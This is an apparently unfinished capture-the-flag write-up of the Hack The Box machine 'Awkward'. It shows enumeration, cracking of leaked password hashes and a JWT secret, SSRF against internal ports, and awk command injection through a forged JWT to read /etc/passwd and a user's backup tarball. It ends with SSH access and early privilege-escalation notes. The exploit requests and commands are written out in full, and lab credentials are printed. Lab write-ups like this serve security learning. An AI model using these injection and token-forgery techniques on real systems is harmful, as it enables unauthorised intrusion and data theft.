# Awkward [In progress!]

## Enumerate Ports and Services

Let's run `nmap` on our host: `10.10.11.185`
`nmap -sC -sT -Pn 10.10.11.185`

Output:
```
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)
|_  256 59365bba3c7821e326b37d23605aec38 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).
```

NOTE: we can also enumerate ports/services via `ffuf` if we get to any dead-ends
`ffuf -w ports.txt -u http://hat-valley.htb:FUZZ`

---

We can see `ssh` and `http` are open
- Plugging in `10.10.11.185` into a browser, we see it resolves to:
    - `http://hat-valley.htb/`
- We need to plug this resolution into `/etc/hosts`

Navigating to the webpage:
- Wappalyzer says the site uses:
    - node.js 
    - vue.js
    - express
        - helpful files:
            - any central app js files
            - core functionality
            - ROUTES!
                - helps us map out the api endpoints
    - Ubuntu (operating system) 
        - helpful files:
            - `/etc/passwd`
            - `/home/<user>/.bashrc`
    - nginx (web server / reverse proxy)
        - helpful files:
            - `/etc/nginx/nginx.conf`, and `/etc/nginx/conf.d/*`

So, it seems that we'll be doing a bit of `js` and `Debian` work


`gobuster` has this to say about `hat-valley.htb`:
```
$ gobuster dir -u hat-valley.htb -w /usr/share/wordlists/dirb/big.txt

/css                  (Status: 301) [Size: 173] [--> /css/]
/favicon.ico          (Status: 200) [Size: 4286]
/js                   (Status: 301) [Size: 171] [--> /js/]
/secci�               (Status: 500) [Size: 1704]
/static               (Status: 301) [Size: 179] [--> /static/]
```

We can use a tool like `dirsearch` to check a directory
- so we can run `dirsearch -u http://hat-valley.htb.js`
    - we get `/js/app`, `/js/app.js`, `/js/custom.js`

In the source, we're seeing many references to `webpack`
- This is a module / script bundler: https://webpack.js.org/
- and is referenced in `js/app.js`

In `app.js` we can see some `eval` statements as well
- inside of those, we see refs to `routes`
    - and there's a route for `/hr` and `/leave`
        - `/leave` redirects to `/hr`


We go to `hat-valley.htb/hr` and it resolves to a login portal!

We can submit a login attempt via an HTTP POST request:
```
POST /api/login HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 67
Origin: http://hat-valley.htb
DNT: 1
Connection: keep-alive
Referer: http://hat-valley.htb/hr/
Cookie: token=guest
Sec-GPC: 1

{"username":"admin","password":"admin"}
```

There is a cookie `token` with a default value of `guest
- if we change it to anything else and reload the page we are redirected to `http://hat-valley.htb/dashboard`

After we log into `hat-valley.htb/dashboard`
- We can go to `hat-valley.htb/leave`
    - here we can submit POST requests to 'Request Leave'


The HTTP POST request looks like this:
```
POST /api/submit-leave HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 72
Origin: http://hat-valley.htb
DNT: 1
Connection: keep-alive
Referer: http://hat-valley.htb/leave
Cookie: token=admin
Sec-GPC: 1

{reason":"admin' || 'a' == 'a","start":"13/12/2022","end":"14/12/2022"}
```

Looking more at `app.js`, and taking the above references to `/api/`
- we can infer the full list of routes 

Routes:
- `/api/staff-details`
- `/api/store-status`
- `/api/all-leave`
- `/api/login`

`staff-details` looks very interesting
- but when we go there, we see a malformed `jwt` error
- means that our token is wrong
    - changing our token to other values worked on the dashboard, but not for this page
    - essentially, providing a value yields an error
        - so what if we remove the token value entirely?
    - reloading gives us an array of data

Data from `/api/staff-details` with blank `token` cookie value
```
[{
"user_id":1,
"username":"christine.wool",
"password":"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
"fullname":"Christine Wool",
"role":"Founder, CEO",
"phone":"0415202922"
},
{
"user_id":2,
"username":"christopher.jones",
"password":"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
"fullname":"Christopher Jones",
"role":"Salesperson",
"phone":"0456980001"
},
{
"user_id":3,
"username":"jackson.lightheart",
"password":"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
"fullname":"Jackson Lightheart",
"role":"Salesperson",
"phone":"0419444111"
},
{
"user_id":4,
"username":"bean.hill",
"password":"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
"fullname":"Bean Hill",
"role":"System Administrator",
"phone":"0432339177"
}]
```

Looks like we got some password hashes!
- let's send them into hashcat
- how to determine what they are? let's try crackstation

Crackstation was able to crack `christopher.jones`'s hash
- it ID'ed the hash as `sha256` and decoded it as `chris123`

Let's use this password on the `/hr` portal and with `ssh`
- first, the `/hr` portal!

We are logged in as `christopher.jones`, and can see his dashboard
- in the spirit of looking at `cookies`, what does ours say?
- we remember from before that the values stored are `jwt`

We see that `christopher.jones` has a `jwt` token of:
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjcwOTg5MTI1fQ.t0E7WNg1iKmO_LKSmYt87168s9RL4mWs_nkcT30AaKo`

Can we crack `jwt`? Can we do it with `john`?
- convert the `jwt` to `ascii`
    - then split the string by `.`'s
    - the first two indices the data
        - we join them together by a `.`
    - the third is the signature
        - we want to b64-decode it
            - then turn it to hex
    - finally we string together the data + `#` + signature
        - and we ascii-decode it to get `john` encoding


First, we take the `jwt`, convert it to `john`, then store it in `jwt.john`, and run
- `john -w=/usr/share/wordlists/rockyou.txt jwt.john`

Our results:
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt jwt.john
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123beany123      (?)     
```

We got ourselves a new password!
- can we use it with `ssh`?
    - no, sadly.

Looking through the HTTP GET requests in the dashboard, we pick up refs to `store.hat-valley.htb` - that reminds us to do subdomain enum with `ffuf`

---

Going back to the leave request page, do we see any injection vulns for the fields?

Also, there is an interesting packet capture in `/dashboard`, when we are loading the various GET requests, there's an interesting one:
```
GET /api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22 HTTP/1.1
Host: hat-valley.htb
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Referer: http://hat-valley.htb/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjcwOTkyNDkyfQ.AtBVE_ff37FXQv2PAroW3wD7xoAGKyaAavp5k0rbAPg
Connection: close
```

There seems to be an embedded url in the `url` field for `/api/store-status`
- GET `/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22`
    - interesting piece of info on the api behavior
    - do we think it's vulnerable to injection?
    - like, point it to our attacker host?
- Currently, the site shows the store as down


If we spawn a listener:
```
nc -nlvp 80
```

When we edit the HTTP GET request to:
```
GET /api/store-status?url=%22http:%2F%2F10.10.14.37%22 HTTP/1.1
```

We get back on our terminal:
```
└─$ nc -nvlp 80  
listening on [any] 80 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.11.185] 37754
GET / HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: axios/0.27.2
Host: 10.10.14.37
Connection: close
```

Can we update this to a reverse shell?
- it looks like it just tries to connect to the url and then closes the connection after it gets a response code from the url it's pining
- so i'm not sure what type of command the server is issuing
- also `axios/0.27.2` is not showing any vulnerabilities via `snyk` or `nuget.qite.be`

The fact that we can query:
`http://hat-valley.htb/api/store-status?url="store.hat-valley.htb"`

The query accessing an ADDITIONAL server means that we could utilize some type of SSRF, meaning, try to access an arbitrary internal server from the endpoint server
- the `url` string allows us to do a GET request on any server which the web server can access

So, internal documents or services on the internal `localhost`'s ports would be available, which could also forward us to other systems (if there's port forwarding enabled on the web server)
- so we can use `ffuf` to enumerate the various types of ports exposed from `localhost`

We want to enumerate all ports 1-65535, so we create a list:
```
for num in {1..65535}
    do
        echo $num >> ports.txt
    done
```

We'll run the command:
`ffuf -w ports.txt -u http://hat-valley.htb/api/store-status?url="http://localhost:FUZZ" | grep -v "Words: 0"` 

This will show us that ports `80`, `3002`, and `8080` are available

If we navigate to `http://hat-valley.htb/api/store-status?url="http://localhost:3002"`, we get access to the Expres API docs! 

---

What stands out is an `exec()` call in `/api/all-leave`
- the command runs `awk` on the provided `user`

`/api/all-leave` is expecting us to pass a `jwt`
- when passing a jwt, it has to be signed with a 'secret'
- if we remember from before, the secret for `christopher.jones` is `123beany123`

So let's encode `{"username": "/etc/passwd"}`
- we can use `https://jwt.io` to build it

When we break down our `jwt`, we'll be plugging in:
- `"awk '/" + user "/'"`

If we pass in `/etc/passwd` to `username`, we get:
```
awk: cmd. line:2: / /etc/passwd /
awk: cmd. line:2:                ^ unexpected newline or end of string
```


So that by itself will not work, it will trigger a syntax error!


How about passing `'/etc/passwd'` into `username`:
```
awk: cmd. line:2: //etc/passwd/
awk: cmd. line:2:              ^ unexpected newline or end of string
```

Another syntax error!


We need to put space between the `''`'s and the file we want to read
- If we run `awk '/' /etc/passwd '/'`, we get `unexpected newline` 
- So we'd want to run: `awk '//' /etc/passwd '/'`
    - In our local shell, we get a dump of the `/etc/passwd` file!
- So, we want to pass in `"/' /etc/passwd '"` for `username`

Here is our HTTP request
```
GET /api/all-leave HTTP/1.1
Host: hat-valley.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nICAgL2V0Yy9wYXNzd2QgICAnIiwiaWF0IjoxNTE2MjM5MDIyfQ.pR4XosqcFDQLADcwLKGNl1v8gmtjeAQnAyX2RCYhM1U
If-None-Match: W/"128-7fIu9LFpPaYjbQJw/tKgaVzge7M"
Connection: close
```

And we get the `/etc/passwd` file
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
whoopsie:x:117:124::/nonexistent:/bin/false
sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
saned:x:121:128::/var/lib/saned:/usr/sbin/nologin
colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false
gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin
mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:130:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:999::/var/log/laurel:/bin/false
```

I'm seeing references to `bean`, `christine`, `avahi`, &c.
- Let's try looking at their `/home/<user>/.bashrc` files! 
- Using the same method as reading `/etc/passwd`

We got it!
```
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

We see a custom alias!
```
# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
```

Let's check it out
```
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
# archive '/home/bean' in '/home/bean/Documents/backup_tmp'
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
# go to 'backup_tmp'
cd /home/bean/Documents/backup_tmp
# archive 'backup_tmp' in 'backup'
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

Looks like we have a directory called `/home/bean/Documents/backup_tmp`
- with a `tarball`! can we `curl` it?
- let's `curl` the `base url` with the `--header` flag with `token=<jwt>` and have it `-o` output to `backup.tar.gz`
- this means we need to create a new `jwt` with the path to the `tarball` as `username`

Here's the request:
```
curl http://hat-valley.htb/api/all-leave --headers "Cookie: token="$(python3 -c "import jwt; print(jwt.encode({\"username\": \"/' /home/bean/Documents/backup/bean_backup_final.tar.gz 'test\", \"iat\":1666598140}, \"123beany123\", algorithm=\"HS256\"))") --output bean_backup_final.tar.gz
```

We `tar xpvf` the contents, and start looking through the data

---

In `.config/xpad/content-DS1ZS1`, we get bean's user/pass combo:
```
Username: bean.hill
password: 014mrbeanrules!#P
```

We also see a note to `Make sure to use this everywere` - will keep that in mind!

Let's `ssh bean@10.10.11.185` with the above password

And we're in! We also can `cat` out the user flag in `user.txt`!
```
bean@awkward:~$ cat user.txt 
b2806835e9dc70e40ef987f84ff79649
bean@awkward:~$ 
```

---

## Privilege Escalation

When we try to run `sudo -l`:
```
bean@awkward:~$ sudo -l
[sudo] password for bean: 
sudo: a password is required
bean@awkward:~$ 
```

We get prompted for a password, as opposed to it showing us what we can run with elevated permissions.

---

I'm stumped - so let's break out `linpeas.sh`. Running that, we see a familiar file referenced in the "Processes" section
```
================================( Processes, Cron & Services )================================
[+] Cleaned processes                                                                                                                                        
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                     
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                   
root           1  0.0  0.2 166844 11800 ?        Ss   Dec14   0:18 /sbin/init auto noprompt splash
root         369  0.0  3.3 203792 131544 ?       S<s  Dec14   0:21 /lib/systemd/systemd-journald
root         402  0.0  0.0 227324   304 ?        Ssl  Dec14   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
root         430  0.0  0.1  26440  6764 ?        Ss   Dec14   0:00 /lib/systemd/systemd-udevd
systemd+     640  0.1  0.1  14824  6228 ?        Ss   Dec14   4:06 /lib/systemd/systemd-oomd
systemd+     641  0.0  0.3  25792 13704 ?        Ss   Dec14   0:20 /lib/systemd/systemd-resolved
systemd+     642  0.0  0.1  89376  6644 ?        Ssl  Dec14   0:08 /lib/systemd/systemd-timesyncd
root         658  0.0  0.0  85232  2336 ?        S<sl Dec14   0:00 /sbin/auditd
_laurel      660  0.0  0.1   7136  5264 ?        S<   Dec14   0:01 /usr/local/sbin/laurel --config /etc/laurel/config.toml
root         668  0.0  0.2  62388 11660 ?        Ss   Dec14   0:00 /usr/bin/VGAuthService
root         685  0.1  0.2 327156  9788 ?        Ssl  Dec14   3:42 /usr/bin/vmtoolsd
root         707  0.0  0.1 101232  5784 ?        Ssl  Dec14   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         865  0.0  0.1 248560  7764 ?        Ssl  Dec14   0:05 /usr/libexec/accounts-daemon
root         867  0.0  0.0   2812  1240 ?        Ss   Dec14   0:00 /usr/sbin/acpid
root         881  0.0  0.0  18148  2944 ?        Ss   Dec14   0:00 /usr/sbin/cron -f -P
message+     885  0.0  0.1   9956  5624 ?        Ss   Dec14   0:10 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         892  0.0  0.4 269364 18032 ?        Ssl  Dec14   0:17 /usr/sbin/NetworkManager --no-daemon
root         950  0.0  0.1  82828  3992 ?        Ssl  Dec14   0:10 /usr/sbin/irqbalance --foreground
root         961  0.0  0.0  18624  3548 ?        Ss   Dec14   0:00 /bin/bash /root/scripts/notify.sh
root         987  0.0  0.0   2988  1156 ?        S    Dec14   0:00 inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv
root         988  0.0  0.0  18624  1748 ?        S    Dec14   0:00 /bin/bash /root/scripts/notify.sh
root         989  0.0  0.2 236936  9948 ?        Ssl  Dec14   0:01 /usr/libexec/polkitd --no-debug
root         995  0.0  0.1 248744  6844 ?        Ssl  Dec14   0:00 /usr/libexec/power-profiles-daemon
syslog       999  0.0  0.1 222400  6324 ?        Ssl  Dec14   0:03 /usr/sbin/rsyslogd -n -iNONE
root        1002 
``` 

Remember the `leave_requests.csv` file referenced in our `awk` command that we exploited to read `/etc/passwd` and other files? 
```
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
```

Let's check that out!
```
bean@awkward:~$ ls /var/www/private/leave_requests.csv
ls: cannot access '/var/www/private/leave_requests.csv': Permission denied
bean@awkward:~$ 
```

That's no good!
Let's see if we can pivot to another user account
